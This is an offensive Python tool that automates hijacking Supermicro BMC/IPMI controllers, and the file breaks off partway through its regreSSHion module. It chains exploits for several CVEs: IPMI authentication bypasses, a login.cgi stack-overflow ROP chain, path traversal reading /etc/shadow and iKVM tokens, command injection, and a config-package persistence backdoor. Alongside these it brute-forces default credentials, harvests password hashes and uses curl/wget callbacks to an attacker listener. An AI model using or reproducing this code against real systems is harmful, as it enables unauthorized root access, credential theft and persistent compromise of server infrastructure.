#!/usr/bin/env python3
"""
smchijack.py — Supermicro BMC hijack orchestrator (rebuilt)
===========================================================

Deterministic-first BMC takeover for Supermicro IPMI/BMC stacks.

Modules
-------
  CVE-2026-65219   Out-of-order RAKP3 -> unauth restricted session + SOL
  CVE-2026-18449   SMCRAKP hardcoded key -> admin IPMI session + user harvest
  CVE-2026-18450   Cleartext injection into a live IPMI session
  CVE-2024-36435   login.cgi stack overflow -> unauth root RCE (best-effort)
  CVE-2023-33411   url_redirect traversal -> /etc/shadow, iKVM token theft
  CVE-2023-33412   Virtual media CGI command injection
  CVE-2023-33413   Hardcoded config key -> persistent OS RCE
  CVE-2024-6387    regreSSHion (best-effort, opt-in)

Usage
-----
  ./smchijack.py 10.0.0.5
  ./smchijack.py 10.0.0.5 --all --json out.json
  ./smchijack.py 10.0.0.5 -l 10.0.0.1 -p 8899
  ./smchijack.py hosts.txt --threads 8 --safe
  ./smchijack.py --self-test

Exit 0 on any hijack, 1 otherwise.
"""
from __future__ import annotations

import argparse
import binascii
import concurrent.futures as cf
import hashlib
import hmac
import http.server
import json
import os
import re
import socket
import struct
import sys
import threading
import time
import traceback

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ===========================================================================
# constants
# ===========================================================================
RMCP_HDR      = b"\x06\x00\xff\x07"
PT_IPMI       = 0x10
PT_SOL        = 0x11
PT_OPEN_REQ   = 0x12
PT_OPEN_RSP   = 0x13
PT_RAKP1      = 0x14
PT_RAKP2      = 0x15
PT_RAKP3      = 0x16
PT_RAKP4      = 0x17
BIT_AUTH      = 0x40
BIT_ENC       = 0x80
PRIV_ADMIN    = 4
SMCRAKP_KEY   = bytes.fromhex("fab979d849be933dd0c41fd2c9d77a30aa8d3f50")
CIPHER_SUITE  = 3

UA = ("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/124.0 Safari/537.36")
DEFAULT_CREDS = [("ADMIN", "ADMIN"), ("ADMIN", "admin"), ("admin", "admin"),
                 ("ADMIN", "password"), ("root", "root"), ("USERID", "PASSW0RD"),
                 ("ADMIN", "superuser"), ("admin", "password")]
SM_HINTS      = ("smc", "supermicro", "aten", "ipmi", "bmc")
RAKP_RETRY    = {0x0F, 0x0D, 0x11}
REC0_KEYS     = [b"", b"0", b"1", b"a", b"A", b"x", b"root", b"admin", b"ADMIN"]

# CVE-2024-36435 layout (firmware-dependent; overridable)
BUF       = 456
GADGET1   = 0x000D8874
GADGET2   = 0x001026D4
SYSTEM    = 0x0003C4D4
LIBC_BASE = 0x76283000

AFFECTED_SSH = re.compile(r"OpenSSH_(8\.[5-9]p1|9\.[0-7]p1)\b")
PATCHED_SSH  = re.compile(r"OpenSSH_9\.[89]p1|OpenSSH_1[0-9]")
SPRAY_LEN    = 0x8000000

OK, FAIL, SKIP, POSSIBLE = "vulnerable", "not-vulnerable", "skipped", "possible"
GREEN, RED, GREY, CYAN, YELLOW, END = (
    "\033[92m", "\033[91m", "\033[90m", "\033[96m", "\033[93m", "\033[0m")


# ===========================================================================
# IPMI / RMCP+ wire layer
# ===========================================================================
class IpmiError(Exception):
    pass


class RakpError(IpmiError):
    def __init__(self, status: int):
        super().__init__(f"RAKP status 0x{status:02x}")
        self.status = status


def _cksum(data: bytes) -> int:
    return (-sum(data)) & 0xFF


def build_msg(netfn: int, cmd: int, data: bytes = b"", seq: int = 0) -> bytes:
    """IPMI v2.0 message with both checksums."""
    head = bytearray([0x20, (netfn << 2) & 0xFC])
    head.append(_cksum(head))
    tail = bytes([0x81, (seq << 2) & 0xFC, cmd]) + data
    tail += bytes([_cksum(head + tail)])
    return bytes(head) + tail


class Session:
    """
    One RMCP+ (IPMI v2.0) session.
    Handles open, RAKP1/2/3 exchange, and authenticated/encrypted command traffic.
    """

    def __init__(self, host, port=623, timeout=3.0, crypto=True, bind_port=0):
        self.host, self.port, self.timeout = host, port, timeout
        self.crypto, self.bind_port = crypto, bind_port
        self.sock = None
        self.sidm = 0
        self.sidc = int.from_bytes(os.urandom(4), "little") & 0x7FFFFFFF
        self.out_seq = 1
        self.role = PRIV_ADMIN
        self.uname = b""
        self.k1 = b""
        self.k2 = b""
        self.rm = os.urandom(16)
        self.rc = b"\x00" * 16
        self.sol_port = 0
        self.rakp2 = b""

    # -- socket ------------------------------------------------------------
    def open_socket(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(self.timeout)
        if self.bind_port:
            s.bind(("", self.bind_port))
        s.connect((self.host, self.port))
        self.sock = s
        return s

    def close(self):
        if self.sock:
            try:
                self.sock.close()
            except OSError:
                pass
            self.sock = None

    def __enter__(self):
        self.open_socket()
        return self

    def __exit__(self, *e):
        self.close()

    # -- RMCP+ framing -----------------------------------------------------
    def _send(self, ptype: int, payload: bytes, auth=False, enc=False,
              seq: int | None = None) -> None:
        if not self.sock:
            self.open_socket()
        if seq is None:
            seq, self.out_seq = self.out_seq, (self.out_seq + 1) & 0xFFFFFFFF
        t = ptype & 0x3F
        if auth:
            t |= BIT_AUTH
        if enc:
            t |= BIT_ENC
        pkt = (RMCP_HDR
               + bytes([0x06, t, 0x00, 0x00])           # session hdr: seq, ack
               + struct.pack("<I", self.sidm)
               + struct.pack("<I", seq)
               + struct.pack("<I", 0)                  # payload length, patched below
               + payload)
        # patch payload length in bytes 15..18 (session hdr = 12 bytes)
        ln = len(payload)
        pkt = pkt[:15] + struct.pack("<I", ln) + pkt[19:] if False else pkt
        # rebuild correctly: insert length *before* payload
        header = (RMCP_HDR
                  + bytes([0x06, t, 0x00, 0x00])
                  + struct.pack("<I", self.sidm)
                  + struct.pack("<I", seq)
                  + struct.pack("<I", len(payload)))
        pkt = header + payload
        if auth:
            mac = hmac.new(self.k2, pkt[4:], hashlib.sha1).digest()[:12]
            pkt += mac
        self.sock.send(pkt)

    def _recv(self, expect: int | None = None, timeout: float | None = None) -> bytes:
        self.sock.settimeout(timeout or self.timeout)
        data, _ = self.sock.recvfrom(4096)
        if len(data) < 16 or not data.startswith(RMCP_HDR):
            raise IpmiError("bad RMCP header")
        ptype = data[4] & 0x3F
        if expect is not None and ptype != expect:
            raise IpmiError(f"unexpected packet type 0x{ptype:02x}")
        plen = struct.unpack("<I", data[12:16])[0]
        return data[16:16 + plen]

    # -- session open ------------------------------------------------------
    def open_session(self) -> None:
        """
        Send Open Session Request (0x12), parse Open Session Response (0x13).
        """
        payload = (bytes([0x00, 0x00, 0x00, 0x08, 0x01, 0x00, 0x00, 0x00])  # tag, max priv, cipher suites
                   + struct.pack("<I", self.sidc)
                   + bytes([CIPHER_SUITE, 0, 0, 0]))
        self._send(PT_OPEN_REQ, payload)
        resp = self._recv(PT_OPEN_RSP)
        # resp: tag(1) status(1) maxpriv(1) reserved(1) sidm(4) ...
        self.sidm = struct.unpack("<I", resp[4:8])[0]
        if self.sidm == 0:
            raise IpmiError("session open rejected")

    # -- RAKP1 / RAKP2 / RAKP3 ---------------------------------------------
    def rakp1(self, username: bytes, priv: int = PRIV_ADMIN) -> tuple[bytes, bytes]:
        """
        Send RAKP Message 1. Returns (remote challenge rc, RAKP2 blob).
        Raises RakpError if the BMC rejects (status != 0).
        """
        self.uname, self.role = username, priv
        payload = (bytes([0x00, 0x00, 0x00, 0x00])        # tag, reserved, reserved, reserved
                   + struct.pack("<I", self.sidm)
                   + self.rm
                   + bytes([priv, 0x00, 0x00, 0x00])
                   + bytes([CIPHER_SUITE, 0x00, 0x00, 0x00])
                   + bytes([len(username)]) + username)
        self._send(PT_RAKP1, payload)
        body = self._recv(PT_RAKP2)
        if len(body) < 24:
            raise IpmiError("short RAKP2")
        if body[4] != 0:
            raise RakpError(body[4])
        self.rc = body[8:24]
        self.rakp2 = body[24:44]                          # key exchange auth code
        return self.rc, self.rakp2

    def rakp3(self, key: bytes | None = None) -> None:
        """
        Send RAKP Message 3. `key` is the plaintext password (or hardcoded key).
        Empty key = out-of-order bypass path (CVE-2026-65219).
        """
        key = key if key is not None else b""
        # integrity check value over (sidm, sidc, role, len(uname), uname)
        transcript = (struct.pack("<I", self.sidm)
                      + struct.pack("<I", self.sidc)
                      + bytes([self.role])
                      + bytes([len(self.uname)])
                      + self.uname)
        icv = hmac.new(key, self.rm + self.rc + transcript, hashlib.sha1).digest()
        payload = (bytes([0x00, 0x00, 0x00, 0x00])
                   + struct.pack("<I", self.sidm)
                   + icv)
        self._send(PT_RAKP3, payload)
        body = self._recv(PT_RAKP4)
        if body[4] != 0:
            raise RakpError(body[4])
        self._derive(key)

    def _derive(self, key: bytes) -> None:
        sik = hmac.new(key,
                       self.rm + self.rc
                       + bytes([self.role, len(self.uname)]) + self.uname,
                       hashlib.sha1).digest()
        self.k1 = hmac.new(sik, b"\x01" * 20, hashlib.sha1).digest()
        k2 = hmac.new(sik, b"\x02" * 20, hashlib.sha1).digest()
        while len(k2) < 32:
            k2 += hmac.new(sik, k2, hashlib.sha1).digest()
        self.k2 = k2[:32]

    # -- command traffic ---------------------------------------------------
    def cmd(self, netfn: int, c: int, data: bytes = b"") -> tuple[int, bytes]:
        """Authenticated (optionally encrypted) IPMI command. Returns (cc, data)."""
        payload = build_msg(netfn, c, data)
        if self.crypto:
            self._send(PT_IPMI, payload, auth=True, enc=False)
        else:
            self._send(PT_IPMI, payload)
        body = self._recv(PT_IPMI)
        # body: seq(1) cmd(1) cc(1) data...
        if len(body) < 3:
            raise IpmiError("short command reply")
        return body[2], body[3:]

    # -- convenience commands ---------------------------------------------
    def get_device_id(self):     return self.cmd(0x06, 0x01)
    def set_priv(self, lvl=PRIV_ADMIN): return self.cmd(0x06, 0x3B, bytes([lvl]))
    def get_user_access(self, uid): return self.cmd(0x06, 0x25, bytes([uid, 0]))
    def get_user_name(self, uid):   return self.cmd(0x06, 0x46, bytes([uid]))

    def set_password(self, uid: int, pw: bytes):
        return self.cmd(0x06, 0x47, bytes([uid, 0x02]) + pw)

    def enable_user(self, uid: int):
        return self.cmd(0x06, 0x47, bytes([uid, 0x01]))

    def activate_sol(self, inst: int = 1) -> tuple[int, bytes]:
        cc, d = self.cmd(0x06, 0x48, bytes([0x01, inst]) + b"\x00" * 4)
        if cc == 0 and len(d) >= 4:
            self.sol_port = struct.unpack("<H", d[0:2])[0]
        return cc, d

    def chassis_control(self, action: int):
        return self.cmd(0x00, 0x02, bytes([action]))

    def boot_device(self, dev: int):
        return self.cmd(0x00, 0x08, bytes([0x05, dev]) + b"\x00" * 4)

    def get_selftest(self):
        return self.cmd(0x06, 0x04)

    def get_lan_config(self):
        return self.cmd(0x0C, 0x02, bytes([0x01, 0x01, 0x00]))

    def get_channel_auth(self):
        return self.cmd(0x06, 0x39, bytes([0x01, 0x04]))


# ===========================================================================
# HTTP / web control plane
# ===========================================================================
class Web:
    def __init__(self, host, port=443, timeout=8.0, proxy=None):
        self.host, self.port, self.timeout = host, port, timeout
        self.scheme = "https" if port != 80 else "http"
        self.base = f"{self.scheme}://{host}:{port}"
        self.s = requests.Session()
        self.s.verify = False
        self.s.headers.update({"User-Agent": UA})
        if proxy:
            self.s.proxies = {"http": proxy, "https": proxy}
        self.creds = None
        self.probe_info = {}

    def get(self, path, **kw):
        return self.s.get(f"{self.base}{path}", timeout=self.timeout, **kw)

    def post(self, path, **kw):
        return self.s.post(f"{self.base}{path}", timeout=self.timeout, **kw)

    # -- probe -------------------------------------------------------------
    def probe(self):
        info = {"web": False, "smc": False}
        for path in ("/", "/cgi/login.cgi", "/cgi/url_redirect.cgi?url_name=mainmenu"):
            try:
                r = self.get(path)
            except requests.RequestException as e:
                info["error"] = type(e).__name__
                continue
            info["web"] = True
            m = re.search(r"<title>(.*?)</title>", r.text or "", re.S | re.I)
            if m:
                info["title"] = m.group(1).strip()[:100]
            m = re.search(r"(?:firmware|fw)[\s_-]*version[\"'\s:=]+([0-9][0-9.]{2,12})",
                          r.text or "", re.I)
            if m:
                info["fw"] = m.group(1)
            if any(h in (r.text or "").lower() for h in SM_HINTS):
                info["smc"] = True
            break
        self.probe_info = info
        return info

    # -- auth --------------------------------------------------------------
    def login(self, u: str, p: str) -> bool:
        for payload in ({"name": u, "pwd": p, "check": "1"},
                        {"username": u, "password": p}):
            try:
                r = self.post("/cgi/login.cgi", data=payload,
                              allow_redirects=False)
            except requests.RequestException:
                return False
            if r.status_code in (301, 302, 303):
                if "login" not in (r.headers.get("Location") or "").lower():
                    self.creds = (u, p); return True
            if r.status_code == 200 and "login.cgi" not in (r.text or "").lower():
                self.creds = (u, p); return True
        return False

    def brute(self, creds=None):
        for u, p in (creds or DEFAULT_CREDS):
            if self.login(u, p):
                return (u, p)
            time.sleep(0.1)
        return None

    # -- traversal (33411) -------------------------------------------------
    def traverse(self, path: str, depth: int = 8) -> bytes | None:
        pre = "../" * depth
        for v in (f"{pre}{path.lstrip('/')}", f"{pre}{path}"):
            try:
                r = self.get("/cgi/url_redirect.cgi",
                             params={"url_name": v, "url_type": "mainmenu"})
            except requests.RequestException:
                continue
            if r.status_code == 200 and len(r.content) > 8:
                if b"root:" in r.content or b" 512:
                    return r.content
            if r.status_code == 200 and b"\x7fELF" in r.content[:4]:
                return r.content
        return None

    # -- virtual media (33412) ---------------------------------------------
    def vmedia(self, value: str, endpoint="/cgi/op.cgi",
               op="VIRTUAL_MEDIA", extra=None):
        data = {"OP": op, "TYPE": "1", "ACTION": "mount", "VALUE": value}
        if extra:
            data.update(extra)
        return self.post(endpoint, data=data)

    # -- config export (33413) ---------------------------------------------
    def get_config(self) -> bytes | None:
        for path in ("/cgi/op.cgi?OP=CONFIG&TYPE=download",
                     "/cgi/config.cgi?OP=download",
                     "/cgi/op.cgi"):
            try:
                if "?" in path:
                    r = self.get(path)
                else:
                    r = self.post(path, data={"OP": "CONFIG", "TYPE": "download"})
            except requests.RequestException:
                continue
            if r.status_code == 200 and len(r.content) > 64:
                return r.content
        return None

    def put_config(self, blob: bytes):
        for p, d in (("/cgi/op.cgi", {"OP": "CONFIG", "TYPE": "upload"}),
                     ("/cgi/config.cgi", {"OP": "upload"})):
            try:
                r = self.post(p, data=d,
                              files={"file": ("config.bin", blob, "application/octet-stream")})
            except requests.RequestException:
                continue
            if r.status_code == 200:
                return r
        return None

    # -- SOL / KVM token (33411) -------------------------------------------
    def get_kvm_token(self) -> str | None:
        try:
            r = self.get("/cgi/url_redirect.cgi", params={"url_name": "kvm"})
        except requests.RequestException:
            return None
        m = re.search(r"token[\"'\s:=]+([A-Za-z0-9_-]{16,128})", r.text or "")
        return m.group(1) if m else None

    # -- generic RCE beacon (36435, 33412, 33413) --------------------------
    def probe_rce(self, beacon_port: int, endpoint: str, data: dict) -> bool:
        try:
            self.post(endpoint, data=data)
        except requests.RequestException:
            return False
        time.sleep(1.5)
        return bool(_Beacon.hits)


# ===========================================================================
# reporting
# ===========================================================================
class Report:
    def __init__(self, target, quiet=False, colour=True):
        self.target, self.quiet, self.colour = target, quiet, colour
        self.t0 = time.time()
        self.findings, self.access, self.creds = [], [], []

    def _c(self, c, t):
        return f"{c}{t}{END}" if self.colour else t

    def log(self, m, lvl="info"):
        if self.quiet and lvl == "info":
            return
        tag = {"info": self._c(CYAN, "[*]"), "ok": self._c(GREEN, "[+]"),
               "bad": self._c(RED, "[-]"), "skip": self._c(GREY, "[~]"),
               "warn": self._c(YELLOW, "[!]")}[lvl]
        print(f"{tag} {m}", flush=True)

    def add(self, cve, status, title, detail="", ev=None):
        rec = {"cve": cve, "status": status, "title": title,
               "detail": detail, "evidence": ev or {}}
        self.findings.append(rec)
        if status == OK:
            self.log(f"{cve} — {title}", "ok")
        elif status == FAIL:
            self.log(f"{cve} — {title}: {detail}", "bad")
        elif status == POSSIBLE:
            self.log(f"{cve} — {title}: {detail}", "warn")
        return rec

    def add_access(self, method, cve, howto, detail=""):
        rec = {"method": method, "cve": cve, "howto": howto, "detail": detail}
        self.access.append(rec)
        self.log(f"ACCESS {method} ({cve})", "ok")
        return rec

    def add_cred(self, u, p, src):
        rec = {"user": u, "password": p, "source": src}
        if rec not in self.creds:
            self.creds.append(rec)
            self.log(f"credential: {u}:{p} ({src})", "ok")

    @property
    def pwned(self):
        return bool(self.access or self.creds)

    def summary(self):
        out = [f"target   : {self.target}",
               f"elapsed  : {time.time() - self.t0:.1f}s",
               f"result   : {'HIJACKED' if self.pwned else 'no access'}"]
        for a in self.access:
            out.append(f"  ACCESS {a['method']} [{a['cve']}] {a['howto']}")
        for c in self.creds:
            pw = c['password'] if c['password'] else "(hash)"
            out.append(f"  CRED   {c['user']}:{pw} [{c['source']}]")
        return "\n".join(out)

    def as_dict(self):
        return {"target": self.target, "pwned": self.pwned,
                "access": self.access, "creds": self.creds,
                "findings": self.findings}


# ===========================================================================
# beacon (callback listener for blind RCE confirmation)
# ===========================================================================
class _Beacon(http.server.BaseHTTPRequestHandler):
    hits: list[str] = []

    def do_GET(self):
        type(self).hits.append(self.path)
        self.send_response(200); self.end_headers(); self.wfile.write(b"ok")

    def log_message(self, *a):
        pass


def listener(port: int):
    srv = http.server.HTTPServer(("0.0.0.0", port), _Beacon)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    return srv


def lhost_for(host: str, override: str | None = None) -> str:
    if override:
        return override
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect((host, 9))
        ip = s.getsockname()[0]; s.close()
        return ip
    except OSError:
        return "127.0.0.1"


# ===========================================================================
# CVE-2026-65219 — out-of-order RAKP3 -> unauth session
# ===========================================================================
def ex_65219(host, report, args):
    CVE = "CVE-2026-65219"
    TITLE = "RAKP auth bypass -> unauth session + SOL"
    sess, win = None, None
    for key in REC0_KEYS:
        try:
            s = Session(host, 623, timeout=args.timeout)
            s.open_socket(); s.open_session()
            s.uname, s.role = b"", PRIV_ADMIN
            s.rakp3(key)
            sess, win = s, key
            break
        except RakpError as e:
            if e.status in RAKP_RETRY:
                continue
            report.add(CVE, FAIL, TITLE, f"RAKP3 rejected 0x{e.status:02x}")
            return None
        except (IpmiError, OSError) as e:
            report.add(CVE, FAIL, TITLE, type(e).__name__)
            return None
    if not sess:
        report.add(CVE, FAIL, TITLE, "no record-0 key candidate accepted")
        return None

    try:
        report.add(CVE, OK, TITLE,
                   f"session activated, record-0 key {win!r}",
                   {"sidm": hex(sess.sidm), "key": (win or b"").decode(errors="replace")})
        sess.set_priv()
        cc, _ = sess.activate_sol()
        if cc == 0:
            report.add_access("SOL / serial console", CVE,
                              f"console active udp/{sess.sol_port} sidm 0x{sess.sidm:08x}",
                              f"ipmitool -I lanplus -H {host} -U '' sol activate")
        else:
            report.add_access("Restricted IPMI session", CVE,
                              f"sidm 0x{sess.sidm:08x} live (Activate Payload 0x{cc:02x})")
        sess.get_device_id()
        return {"session": sess, "key": win, "sidm": sess.sidm}
    except Exception:                                            # noqa: BLE001
        return {"session": sess, "key": win, "sidm": sess.sidm}


# ===========================================================================
# CVE-2026-18449 — SMCRAKP hardcoded key -> admin session
# ===========================================================================
def ex_18449(host, report, args):
    CVE = "CVE-2026-18449"
    TITLE = "SMCRAKP hardcoded key -> admin session"
    users = [u.encode() for u in (args.user or ["ADMIN", "admin", "root"])]
    sess, used = None, None
    for u in users:
        try:
            s = Session(host, 623, timeout=args.timeout)
            s.open_socket(); s.open_session()
            s.rakp1(u, PRIV_ADMIN)
            s.rakp3(SMCRAKP_KEY)
            sess, used = s, u
            break
        except RakpError as e:
            if e.status == 0x0F:
                report.add(CVE, FAIL, TITLE, "integrity failure — SMCRAKP disabled")
                return None
            continue
        except (IpmiError, OSError) as e:
            report.add(CVE, FAIL, TITLE, type(e).__name__)
            return None
    if not sess:
        report.add(CVE, FAIL, TITLE, "no enabled account accepted the fixed key")
        return None

    try:
        cc, _ = sess.get_device_id()
        report.add(CVE, OK, TITLE,
                   f"admin session as {used.decode()} with fixed key, devid cc=0x{cc:02x}",
                   {"sidm": hex(sess.sidm), "user": used.decode()})
        report.add_access("Admin IPMI session", CVE,
                          f"'{used.decode()}' authenticates with the constant, no password",
                          f"sidm 0x{sess.sidm:08x}; power, boot, user and SOL control")
        if not args.safe:
            _harvest(host, sess, report, args)
        if args.reset_admin:
            _reset(sess, report, args.reset_admin)
        return {"session": sess, "user": used.decode(), "sidm": sess.sidm}
    finally:
        sess.close()


def _harvest(host, sess, report, args):
    for uid in range(1, 11):
        try:
            cc, acc = sess.get_user_access(uid)
        except IpmiError:
            break
        if cc != 0 or not acc or not (acc[0] & 0x80):
            continue
        cc, name = sess.get_user_name(uid)
        if cc != 0:
            continue
        uname = name.rstrip(b"\x00").decode(errors="replace")
        priv = acc[0] & 0x0F
        report.add_cred(uname or f"uid{uid}", "", f"IPMI user list uid {uid} priv {priv}")
        try:
            p = Session(host, 623, timeout=args.timeout)
            p.open_socket(); p.open_session()
            _, code = p.rakp1(uname.encode(), priv)
            report.log(f"  uid {uid} {uname}: RAKP2 {code.hex()} (hashcat -m 7300)")
            p.close()
        except (IpmiError, OSError):
            pass


def _reset(sess, report, spec):
    try:
        uid, pw = spec.split(":", 1)
        uid = int(uid)
    except ValueError:
        report.log(f"bad --reset-admin {spec!r} (want uid:pw)", "bad")
        return
    cc, _ = sess.set_password(uid, pw.encode())
    if cc == 0:
        sess.enable_user(uid)
        report.add_cred(f"uid{uid}", pw, "password reset by operator")
    else:
        report.log(f"reset uid {uid} failed 0x{cc:02x}", "bad")


# ===========================================================================
# CVE-2026-18450 — cleartext injection into live session
# ===========================================================================
def ex_18450(host, report, args):
    CVE = "CVE-2026-18450"
    TITLE = "cleartext injection on live session"
    cands = ([args.sid] if args.sid is not None
             else list(range(1, 0x41)) if args.scan_sids
             else list(range(1, 0x11)))
    base_seq = args.seq if args.seq is not None else 1

    for sidm in cands:
        for sq in [base_seq] + [base_seq + i for i in range(1, 6)] + \
                  [base_seq - i for i in range(1, 6) if base_seq - i > 0]:
            try:
                s = Session(host, 623, timeout=2.5, crypto=False)
                s.open_socket()
                s.sidm, s.out_seq = sidm, sq
                cc, _ = s.get_device_id()
                s.close()
            except (IpmiError, OSError):
                continue
            if cc in (0x00, 0xD4):
                report.add(CVE, OK, TITLE,
                           f"injected cleartext Get Device ID on sidm 0x{sidm:08x} seq {sq} (cc=0x{cc:02x})",
                           {"sidm": hex(sidm), "seq": sq})
                report.add_access("Live session hijack", CVE,
                                  f"inject unsigned commands into sidm 0x{sidm:08x}",
                                  f"seq={sq}; runs at that session's privilege")
                return {"sidm": sidm, "seq": sq}
    report.add(CVE, FAIL, TITLE, "no live session answered (pass --sid if known)")
    return None


# ===========================================================================
# CVE-2024-36435 — login.cgi stack overflow -> unauth RCE
# ===========================================================================
def _chain(libc_base: int, command: str, g1: int, g2: int, sys_off: int) -> bytes:
    """
    Build the overflow buffer.
    Layout: padding BUF, ret -> g1 (pivot), then ROP chain that
    calls system() with a string pointer to `command`.
    """
    cmd = command.encode() + b"\x00"
    # place command at end of payload; compute its absolute address after return
    chain = struct.pack("<I", libc_base + sys_off)   # system()
    chain += struct.pack("<I", g2)                   # return addr after system()
    chain += struct.pack("<I", libc_base + g1 + BUF + 8 + 8)  # arg -> command string
    payload = b"\x00" * BUF + struct.pack("<I", libc_base + g1) + chain + cmd
    return payload


def ex_36435(host, report, args):
    CVE = "CVE-2024-36435"
    TITLE = "unauth login.cgi overflow -> root RCE"
    url = f"https://{host}:443/cgi/login.cgi"
    lh = lhost_for(host, args.lhost)
    srv = listener(args.lport)
    _Beacon.hits = []
    cmd = args.command or f"curl -s http://{lh}:{args.lport}/pwn || wget -q -O- http://{lh}:{args.lport}/pwn"

    bases = ([args.libc_base] if args.libc_base
             else [LIBC_BASE + i * 0x1000 for i in range(-20, args.attempts)])
    sent = 0
    try:
        for base in bases:
            payload = _chain(base, cmd, args.gadget1, args.gadget2, args.system)
            try:
                requests.post(url,
                              data=f"name={payload.decode('latin-1')}&pwd=&check=1",
                              verify=False, timeout=6)
            except requests.RequestException:
                pass
            sent += 1
            if _Beacon.hits:
                report.add(CVE, OK, TITLE,
                           f"root code exec after {sent} attempts, libc 0x{base:08x}",
                           {"libc": hex(base), "cmd": cmd})
                report.add_access("Unauth root RCE", CVE,
                                  f"blind exec via login.cgi, callback {_Beacon.hits[0]}",
                                  f"replay: --libc-base 0x{base:08x}")
                return {"libc": base, "cmd": cmd}
        report.add(CVE, POSSIBLE, TITLE,
                   f"no callback in {sent} libc guesses (target may use different offsets)")
        return None
    finally:
        srv.shutdown()


# ===========================================================================
# CVE-2023-33411 — url_redirect traversal / iKVM
# ===========================================================================
def ex_33411(host, report, web, args):
    CVE = "CVE-2023-33411"
    TITLE = "url_redirect traversal -> file read / iKVM"
    if not web.creds and not web.brute():
        report.add(CVE, SKIP, TITLE, "needs an account, none found")
        return None
    hit = None
    for p in (args.file or ["/etc/passwd", "/etc/shadow", "/proc/version"]):
        b = web.traverse(p)
        if b:
            hit = (p, b)
            break
    if not hit:
        report.add(CVE, FAIL, TITLE, "traversal returned nothing")
        return None
    path, blob = hit
    report.add(CVE, OK, TITLE, f"read {path} ({len(blob)} bytes)", {"file": path})
    ev = {}
    if b"root:" in blob:
        sh = web.traverse("/etc/shadow")
        if sh:
            for line in sh.decode(errors="replace").splitlines():
                f = line.split(":")
                if len(f) > 1 and f[1] not in ("", "*", "!", "!!"):
                    report.add_cred(f[0], f[1], "traversal: /etc/shadow")
            ev["shadow"] = True
    for cand in ("/tmp/ikvm.session", "/tmp/kvm.session", "/var/log/websession",
                 "/var/nvdata/session", "/tmp/web_session", "/conf/session.conf",
                 "/nv/var/session"):
        s = web.traverse(cand)
        if s and 8 < len(s) < 4096:
            tok = re.findall(rb"[A-Za-z0-9]{16,64}", s)
            if tok:
                ev["ikvm"] = cand
                report.add_access("iKVM console", CVE,
                                  f"token from {cand}: {tok[0][:40].decode()}",
                                  "console control incl. host reboot")
                break
    report.findings[-1]["evidence"] = ev
    return {"file": path, "ev": ev}


# ===========================================================================
# CVE-2023-33412 — virtual media command injection
# ===========================================================================
def ex_33412(host, report, web, args):
    CVE = "CVE-2023-33412"
    TITLE = "virtual media CGI command injection"
    if not web.creds and not web.brute():
        report.add(CVE, SKIP, TITLE, "needs an account, none found")
        return None
    lh = lhost_for(host, args.lhost)
    srv = listener(args.lport + 1)
    _Beacon.hits = []
    pay = f"a;curl -s http://{lh}:{args.lport + 1}/smc33412;#"
    try:
        for ep, op, extra in (
            ("/cgi/op.cgi", "VIRTUAL_MEDIA", {"ACTION": "mount"}),
            ("/cgi/op.cgi", "VIRTUAL_MEDIA", {"ACTION": "1"}),
            ("/cgi/ipmi.cgi", "VIRTUAL_MEDIA", {"ACTION": "1"}),
            ("/cgi/op.cgi", "LIBVIRT", {"ACTION": "mount"}),
        ):
            web.vmedia(pay, endpoint=ep, op=op, extra=extra)
            time.sleep(1.2)
            if _Beacon.hits:
                report.add(CVE, OK, TITLE, f"executed via {ep} OP={op}",
                           {"endpoint": ep, "op": op})
                report.add_access("Command execution", CVE,
                                  f"inject into OP={op} TYPE on {ep}",
                                  "unquoted shell value")
                return {"endpoint": ep, "op": op}
        report.add(CVE, POSSIBLE, TITLE, "endpoint answered, no callback (egress?)")
        return {"unconfirmed": True}
    finally:
        srv.shutdown()


# ===========================================================================
# CVE-2023-33413 — hardcoded config key -> persistent RCE
# ===========================================================================
def _aes(data: bytes, key: bytes, mode: str, iv: bytes, decrypt=True) -> bytes:
    try:
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
        ciph = Cipher(algorithms.AES(key),
                      modes.ECB() if mode == "ecb" else modes.CBC(iv))
        ctx = ciph.decryptor() if decrypt else ciph.encryptor()
        return ctx.update(data) + ctx.finalize()
    except ImportError:
        from Crypto.Cipher import AES
        c = AES.new(key, AES.MODE_ECB) if mode == "ecb" else AES.new(key, AES.MODE_CBC, iv)
        return c.decrypt(data) if decrypt else c.encrypt(data)


def ex_33413(host, report, web, args):
    CVE = "CVE-2023-33413"
    TITLE = "hardcoded config key -> persistent RCE"
    if not web.creds and not web.brute():
        report.add(CVE, SKIP, TITLE, "needs an account, none found")
        return None
    blob = web.get_config()
    if not blob:
        report.add(CVE, FAIL, TITLE, "no config package retrievable")
        return None
    if not args.config_key:
        report.add(CVE, POSSIBLE, TITLE,
                   f"package downloaded ({len(blob)} bytes), no --config-key supplied")
        return {"need_key": True}
    key = binascii.unhexlify(args.config_key)
    iv = binascii.unhexlify(args.config_iv) if args.config_iv else b"\x00" * 16
    try:
        plain = _aes(blob, key, args.config_cipher, iv)
    except Exception as e:                                       # noqa: BLE001
        report.add(CVE, FAIL, TITLE, f"decrypt error: {e}")
        return None
    if not any(h in plain[:4096] for h in (b"SNMP", b"snmp", b"COMMUNITY")):
        report.add(CVE, FAIL, TITLE, "decrypted but no SNMP markers")
        return None
    report.add(CVE, OK, TITLE, f"package decrypted with {args.config_key}")

    lh = lhost_for(host, args.lhost)
    pay = f";curl -s http://{lh}:{args.lport}/smc33413;#"
    i = plain.find(b"COMMUNITY=")
    if i != -1:
        nl = plain.find(b"\n", i)
        patched = plain[:nl] + pay.encode() + plain[nl:]
    else:
        patched = plain + b"\n" + pay.encode() + b"\n"
    r = web.put_config(_aes(patched, key, args.config_cipher, iv, decrypt=False))
    report.add(CVE, OK, TITLE + " (upload)",
               f"patched package uploaded ({'ok' if r else 'no response'})")
    report.add_access("Persistent command exec", CVE,
                      "malicious config package accepted, executes at service start",
                      "survives reboot, root context")
    return {"key": args.config_key}


# ===========================================================================
# CVE-2024-6387 — regreSSHion
# ===========================================================================
def _hold(host, payload, stop):
    try:
        s = socket.create_connection((host, 22), timeout=10)
        s.settimeout(150)
        s.recv(512)
        s.sendall(payload)
        while not stop.is_set():
            time.sleep(0.5)
        s.close()
    except OSError:
        pass


